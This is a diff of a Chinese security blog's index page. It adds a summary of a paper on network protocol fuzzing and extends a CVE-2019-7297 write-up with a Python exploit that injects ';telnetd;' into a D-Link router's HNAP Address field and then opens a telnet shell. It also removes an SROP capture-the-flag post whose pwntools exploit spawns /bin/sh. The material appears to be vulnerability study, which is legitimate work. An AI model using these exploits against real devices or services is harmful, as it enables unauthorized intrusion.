@@ -60,10 +60,10 @@
 			</ul>
 		</nav>
                                 <nav>
-                                               总文章数 39
+                                               总文章数 40
                                 </nav>
                                 <nav>
-	总字数 <span class="post-count">66k</span>
+	总字数 <span class="post-count">66.9k</span>
                                 </nav>
 		<nav class="header-smart-menu">
     		
@@ -158,12 +158,113 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-A-Systematic-Review-of-Network-Protocol-Fuzzing-Techniques" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        <div align="center" class="post-count">
+    字数：2.4k字 | 预计阅读时长：8分钟
+</div>
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2024/01/31/A-Systematic-Review-of-Network-Protocol-Fuzzing-Techniques/">A Systematic Review of Network Protocol Fuzzing Techniques</a>
+    </h1>
+  
+
+        
+        <a href="/2024/01/31/A-Systematic-Review-of-Network-Protocol-Fuzzing-Techniques/" class="archive-article-date">
+  	<time datetime="2024-01-30T16:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2024-01-31</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="A-Systematic-Review-of-Network-Protocol-Fuzzing-Techniques"><a href="#A-Systematic-Review-of-Network-Protocol-Fuzzing-Techniques" class="headerlink" title="A Systematic Review of Network Protocol Fuzzing Techniques"></a>A Systematic Review of Network Protocol Fuzzing Techniques</h1><p><strong>Published in:</strong> <a target="_blank" rel="noopener" href="https://ieeexplore.ieee.org/xpl/conhome/9481956/proceeding">2021 IEEE 4th Advanced Information Management, Communicates, Electronic and Automation Control Conference (IMCEC)</a></p>
+<p>本文详细介绍了网络协议模糊测试技术和机器学习技术在网络协议模糊测试中的应用研究进展。最后，总结了网络协议模糊测试技术存在的一些问题，并展望了未来的研究方向。</p>
+<p>网络协议模糊测试的基本原理是通过生成或突变来构造畸形数据包，然后通过套接字将畸形数据包发送给被测协议实体，并监控被测协议实体，以发现网络协议实现中的漏洞。模糊测试的关键是要遵守被测试协议实体的协议规范和状态机制，构建被测试协议实体可以接收和处理的畸形数据包。</p>
+<h2 id="网络协议模糊测试技术的分类"><a href="#网络协议模糊测试技术的分类" class="headerlink" title="网络协议模糊测试技术的分类"></a>网络协议模糊测试技术的分类</h2><p>基于生成的网络协议模糊测试主要分为预生成和自动生成两种类型。</p>
+<ol>
+<li>预生成方法需要分析协议实体使用的协议规范，了解字段支持的数据结构和字段接受的值范围，然后生成测试边界条件或违反规范的测试用例。自动生成方法需要研究协议实体的协议规范，然后创建描述协议规范的语法。通过这种方法，测试人员可以确定协议消息中禁止随意修改的静态字段和可以更改的动态字段，并生成在生成策略方面违反某些规范的测试用例。这种方法可以保证较高的接收率，但畸形程度较低。</li>
+<li>基于突变的网络协议模糊测试是捕获网络中正常的通信协议消息，根据突变策略将协议消息中的数据转换为非法值，生成畸形的测试用例，并对协议实体进行模糊测试。这种方法不是事先研究网络协议，而是拦截客户端和服务器之间通信中的网络流量，并根据突变策略以字节或协议特征为单位修改数据。这种方法节省了大量的人力，并且对测试人员的网络协议专业知识要求不高。但是，协议实体可能会拒绝接收具有非法值的测试用例，导致接收率较低，从而影响模糊测试的效率。</li>
+</ol>
+<h2 id="网络协议模糊测试的基本流程"><a href="#网络协议模糊测试的基本流程" class="headerlink" title="网络协议模糊测试的基本流程"></a>网络协议模糊测试的基本流程</h2><p><img src="/2024/01/31/A-Systematic-Review-of-Network-Protocol-Fuzzing-Techniques/image-20240131150858067.png"></p>
+<ol>
+<li>确定目标。为了选择合适的网络协议模糊测试工具或技术，我们需要充分了解并确定协议实体。</li>
+<li>识别输入。通常，大多数漏洞都是因为协议实体在接收外部输入时无法正确处理某些非法数据而被利用的。因此，考虑协议实体的所有可能输入对于网络协议模糊测试的成功具有重要意义。</li>
+<li>构造测试用例。构建测试用例是网络协议模糊测试过程中的关键步骤，测试用例生成方法决定了模糊测试的效率。通常，测试用例生成方法可以分为两类：基于生成的和基于突变的。在测试用例的构造中，可以采用其中一种方法或两种方法。</li>
+<li>监视执行并筛选异常。根据协议实体中测试用例的执行情况，观察协议实体是否行为异常或崩溃，并根据结果判断漏洞。</li>
+<li>确定可用性。根据不同的协议实体，进一步确定识别出的漏洞是否可以被利用。</li>
+</ol>
+<h2 id="网络协议模糊测试系统的基本结构"><a href="#网络协议模糊测试系统的基本结构" class="headerlink" title="网络协议模糊测试系统的基本结构"></a>网络协议模糊测试系统的基本结构</h2><p>网络协议模糊测试系统通常由四个模块组成：测试用例生成器、被测协议实体、异常监控器和异常分析器，如图所示</p>
+<p><img src="/2024/01/31/A-Systematic-Review-of-Network-Protocol-Fuzzing-Techniques/image-20240131151005560.png"></p>
+<ol>
+<li>测试用例生成器基本上是根据测试用例生成策略为被测试的协议实体生成测试用例，可分为基于生成的方法、基于突变的方法和两种方法的组合。如果采用基于生成的方法，则测试用例生成器会根据对被测协议实体的协议规范的分析来指导测试用例的生成。如果采用基于突变的方法，则测试用例生成器从有效消息开始，并使用不同的突变策略来帮助生成格式错误的消息。</li>
+<li>为了选择合适的网络协议模糊测试工具或技术，有必要指定被测试的协议实体，它可以是客户端、服务器或用于实现协议的任何软件。</li>
+<li>当被测试的协议实体在模糊测试过程中崩溃或出错时，异常监控器会收集相关的异常信息，帮助测试人员分析是否存在漏洞。</li>
+<li>异常分析主要包括异常的位置和原因。常用的方法是使用IDA Pro、OllyDbg等二元分析工具进行人工分析，因此是一项劳动密集型且耗时的工作。异常分析器可以自动分析漏洞的利用能力，大大提高了异常分析的效率。</li>
+</ol>
+<h2 id="应用于网络协议模糊测试的机器学习技术"><a href="#应用于网络协议模糊测试的机器学习技术" class="headerlink" title="应用于网络协议模糊测试的机器学习技术"></a>应用于网络协议模糊测试的机器学习技术</h2><p>针对协议规范和实现代码未知的问题，2017年，Rong Fan和Yaoyao Chang提出了一种自动生成专有网络协议测试用例的黑盒模糊测试方法。该方法使用 seq2seq 模型从通信流量中学习专有网络协议的输入模型，并自动生成协议消息以对协议实现执行模糊测试。</p>
+<p>2018年，胡志成等人开发了基于GAN的工业控制网络协议自动模糊框架GANFuzz。GANFuzz通过在生成对抗网络中训练生成的模型来学习协议语法，以估计工业控制网络协议消息的基本分布函数，并生成结构良好的测试用例。GANFuzz 在开放和专有的工业控制网络协议中都有很好的应用。但是，GANFuzz 不支持有状态网络协议。</p>
+<p>2019年，Hui Zhao等人开发了基于seq2seq模型的模糊测试框架SeqFuzzer 。SeqFuzzer 自动从通信流量中学习协议格式，并生成虚假但合理的消息作为测试用例。当EtherCAT报文格式未知时，SeqFuzzer可以自动生成接收率高的测试用例，并成功检测出多个安全漏洞。</p>
+<p>2019年，Zhihui Li等人提出了一种基于WGAN的工业控制网络协议测试用例自动生成方法。该方法可以学习真实数据帧的结构和分布，并在不知道详细协议规范的情况下生成相似的数据帧。</p>
+<p>2020年，Peiyuan Zong等提出了一种基于深度学习的FuzzGuard方法。FuzzGuard 可以在不执行目标程序的情况下预测输入的可访问性，因此有向灰盒模糊器 AFLGo 可以过滤掉无法到达的输入，提高模糊测试的效率。FuzzGuard 也适用于网络协议。</p>
+<h2 id="网络协议模糊测试技术存在的问题"><a href="#网络协议模糊测试技术存在的问题" class="headerlink" title="网络协议模糊测试技术存在的问题"></a>网络协议模糊测试技术存在的问题</h2><p>2002年，在网络协议模糊测试中首次引入协议格式，大大提高了测试用例的有效性和漏洞发现的效率。然而，这种模糊器在获取协议格式时依赖于手动分析，这导致网络协议模糊测试的自动化程度较低。</p>
+<p>基于突变的方法由于随机突变策略，无法保证测试用例的质量，因此被测试协议实体需要执行大量的测试用例来寻找有效的测试用例，这严重影响了有效测试用例的执行效率。</p>
+<p>基于生成的方法可以大大提高测试用例的有效性，但往往需要在前期投入大量时间来研究协议规范，这间接影响了有效测试用例的执行效率。</p>
+<p>在当前的模糊测试框架中，有状态网络协议的模糊测试方法很少。就模糊测试的基本原理而言，每个测试用例都是独立生成和执行的。这样的测试用例对于单状态网络协议模糊测试更有效。当用于有状态网络协议模糊测试时，它们无法帮助协议实体的状态转换。因此，有状态网络协议中只能覆盖部分代码，很难确保所有状态转换都经过测试。</p>
+<h2 id="网络协议模糊测试技术的未来研究方向"><a href="#网络协议模糊测试技术的未来研究方向" class="headerlink" title="网络协议模糊测试技术的未来研究方向"></a>网络协议模糊测试技术的未来研究方向</h2><h3 id="提高模糊测试的自动化程度"><a href="#提高模糊测试的自动化程度" class="headerlink" title="提高模糊测试的自动化程度"></a>提高模糊测试的自动化程度</h3><p>自动化和智能网络协议模糊测试技术的研究备受关注。一种解决方案是将生物学中的遗传算法应用于提高模糊测试的自动化程度。</p>
+<h3 id="优化测试用例过滤策略"><a href="#优化测试用例过滤策略" class="headerlink" title="优化测试用例过滤策略"></a>优化测试用例过滤策略</h3><p>将神经网络模型与网络协议模糊测试技术相结合，利用神经网络模型从海量数据中提取规则和知识，并自动过滤无效测试用例，从而提高模糊测试的效率。</p>
+<h3 id="有状态网络协议模糊测试方法的研究"><a href="#有状态网络协议模糊测试方法的研究" class="headerlink" title="有状态网络协议模糊测试方法的研究"></a>有状态网络协议模糊测试方法的研究</h3><p>基于网络协议状态遍历图构建测试用例序列，从而有效覆盖更多状态。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2024/01/31/A-Systematic-Review-of-Network-Protocol-Fuzzing-Techniques/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-CVE-2019-7297漏洞" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         <div align="center" class="post-count">
-    字数：740字 | 预计阅读时长：3分钟
+    字数：1.1k字 | 预计阅读时长：5分钟
 </div>
         
   
@@ -206,6 +307,9 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping address -c number -w number -s size &gt; /tmp/ping.txt 2&gt;&gt;/tmp/ping.txt</span><br></pre></td></tr></table></figure>
 
 <p>在system之前并没有对这些外来参数进行检查，如果address为<code>;telnetd;</code>就能启动Telnet服务。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">IP=<span class="string">&#x27;192.168.0.1&#x27;</span></span><br><span class="line"></span><br><span class="line">headers = requests.utils.default_headers()</span><br><span class="line">headers[<span class="string">&quot;User-Agent&quot;</span>] = <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36&quot;</span></span><br><span class="line">headers[<span class="string">&quot;SOAPAction&quot;</span>] = <span class="string">&#x27;&quot;http://purenetworks.com/HNAP1/SetNetworkTomographySettings&quot;&#x27;</span></span><br><span class="line">headers[<span class="string">&quot;Content-Type&quot;</span>] = <span class="string">&quot;text/xml; charset=UTF-8&quot;</span></span><br><span class="line">headers[<span class="string">&quot;Accept&quot;</span>]=<span class="string">&quot;*/*&quot;</span></span><br><span class="line">headers[<span class="string">&quot;Accept-Encoding&quot;</span>]=<span class="string">&quot;gzip, deflate&quot;</span></span><br><span class="line">headers[<span class="string">&quot;Accept-Language&quot;</span>]=<span class="string">&quot;zh-CN,zh;q=0.9,en;q=0.8&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;\</span></span><br><span class="line"><span class="string">  &lt;soap:Body&gt;\</span></span><br><span class="line"><span class="string">    &lt;SetNetworkTomographySettings xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;\</span></span><br><span class="line"><span class="string">      &lt;Address&gt;;telnetd;&lt;/Address&gt;\</span></span><br><span class="line"><span class="string">      &lt;Number&gt;4&lt;Number&gt;\</span></span><br><span class="line"><span class="string">          &lt;Size&gt;4&lt;/Size&gt;\</span></span><br><span class="line"><span class="string">     &lt;/SetNetworkTomographySettings&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;&#x27;</span></span><br><span class="line">r = requests.post(<span class="string">&#x27;http://&#x27;</span>+IP+<span class="string">&#x27;/HNAP1/&#x27;</span>, headers=headers, data=payload)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line">headers[<span class="string">&quot;SOAPAction&quot;</span>] = <span class="string">&#x27;&quot;http://purenetworks.com/HNAP1/GetNetworkTomographyResult&quot;&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;\</span></span><br><span class="line"><span class="string">  &lt;soap:Body&gt;\</span></span><br><span class="line"><span class="string">    &lt;GetNetworkTomographyResult xmlns=&quot;http://purenetworks.com/HNAP1/&quot;&gt;\</span></span><br><span class="line"><span class="string">     &lt;/GetNetworkTomographyResult&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;&#x27;</span></span><br><span class="line">r = requests.post(<span class="string">&#x27;http://&#x27;</span>+IP+<span class="string">&#x27;/HNAP1/&#x27;</span>, headers=headers, data=payload)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line">p=remote(IP,<span class="number">23</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
 <h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>ghidra看一下</p>
 <p><img src="/2024/01/31/CVE-2019-7297%E6%BC%8F%E6%B4%9E/image-20240201133626818.png"></p>
 <p>在ida中alt+t查找0x1b72等关键变量，定位到apmib_set的位置，结合ghidra的反汇编代码，确定在<code>SetNetworkTomographySettings</code>函数中可以对这些参数进行设置。</p>
@@ -1295,110 +1399,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2023/10/12/Target-Fuzz/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-SROP" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        <div align="center" class="post-count">
-    字数：411字 | 预计阅读时长：2分钟
-</div>
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/09/18/SROP/">SROP</a>
-    </h1>
-  
-
-        
-        <a href="/2023/09/18/SROP/" class="archive-article-date">
-  	<time datetime="2023-09-18T07:32:56.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-09-18</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>SROP</p>
-<p>x86参数都是保存在栈上面的， 而 x64 中的前六个参数依次保存在 RDI, RSI, RDX, RCX, R8 和 R9 中，如果还有更多的参数的话才会保存在栈上。</p>
-<p>32 位的 sigreturn 的系统调用号为 77，64 位的系统调用号为 15</p>
-<p>改变rax的值可以通过pop rax ret或者read函数（read返回时会将rax赋成读取的字节数）。</p>
-<p><img src="/2023/09/18/SROP/image-20230919133510975.png"></p>
-<p>Set *addr &#x3D; value  给地址赋值  Set $rsp &#x3D; value  给寄存器赋值</p>
-<p>例题：ciscn_s_3</p>
-<p>先获取&#x2F;bin&#x2F;sh\x00的位置。</p>
-<p>先输入aaaaaaaa</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search aaaaaaaa</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/09/18/SROP/image-20230918205250352.png"></p>
-<p>获得其地址</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x/8gx 0x7fffffffde10</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2023/09/18/SROP/image-20230918205322271.png"></p>
-<p>可以看到后续泄露了一个地址 0x00007fffffffdf38</p>
-<p>计算其和aaaaaaaa地址的偏移得</p>
-<p><img src="/2023/09/18/SROP/image-20230918205433726.png"></p>
-<p>即0x128</p>
-<p>或者直接调试</p>
-<p><img src="/2023/09/18/SROP/image-20230918205824784.png"></p>
-<p>binsh地址：0x7fffd6be7ca0</p>
-<p><img src="/2023/09/18/SROP/image-20230918205901928.png"></p>
-<p>泄漏的地址：0x7fffd6be7dc8</p>
-<p>同样 0x7fffd6be7dc8-0x7fffd6be7ca0&#x3D; 0x128</p>
-<p>找到mov rax，0xf</p>
-<p><img src="/2023/09/18/SROP/image-20230919134737096.png"></p>
-<p>syscall &#x3D; 0x400501</p>
-<p>通过SigreturnFrame()构造</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># execve(&#x27;/bin/sh&#x27;, 0, 0)</span></span><br><span class="line"><span class="comment"># rax 0x59</span></span><br><span class="line"><span class="comment"># rdi &#x27;/bin/sh&#x27;</span></span><br><span class="line"><span class="comment"># rsi NULL</span></span><br><span class="line"><span class="comment"># rdx NULL</span></span><br><span class="line">frame1.rax = constants.SYS_execve</span><br><span class="line">frame1.rdi = binsh_addr</span><br><span class="line">frame1.rsi = <span class="number">0</span></span><br><span class="line">frame1.rdx = <span class="number">0</span></span><br><span class="line">frame1.rip = syscall  <span class="comment"># 触发execve</span></span><br></pre></td></tr></table></figure>
-
-<p>相当于执行execve(‘&#x2F;bin&#x2F;sh’, 0, 0)</p>
-<p>payload：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch =<span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.terminal= [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote(&#x27;node4.buuoj.cn&#x27;,29614)</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_s_3&#x27;</span>)</span><br><span class="line"></span><br><span class="line">vuln = elf.sym[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(vuln))</span><br><span class="line">syscall = <span class="number">0x0400501</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># # gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line">```</span><br><span class="line">payload = (<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).ljust(<span class="number">0x10</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(vuln)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">addr = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">0x8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(addr))</span><br><span class="line">binsh_addr = addr-<span class="number">0x128</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sigreturn = <span class="number">0x04004DA</span></span><br><span class="line"></span><br><span class="line">frame1 = SigreturnFrame()</span><br><span class="line">frame1.rax = constants.SYS_execve</span><br><span class="line">frame1.rdi = binsh_addr</span><br><span class="line">frame1.rsi = <span class="number">0</span></span><br><span class="line">frame1.rdx = <span class="number">0</span></span><br><span class="line">frame1.rip = syscall</span><br><span class="line"></span><br><span class="line">payload = (<span class="string">b&#x27;/bin/sh\x00&#x27;</span>).ljust(<span class="number">0x10</span>,<span class="string">b&#x27;b&#x27;</span>) + p64(sigreturn) +p64(syscall) + <span class="built_in">bytes</span>(frame1) + p64(vuln)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">```</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>附</p>
-<p><img src="/2023/09/18/SROP/image-20230919142004043.png"></p>
-<p><a target="_blank" rel="noopener" href="https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md">https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md</a></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2023/09/18/SROP/">展开全文 >></a>
         </p>
       
 
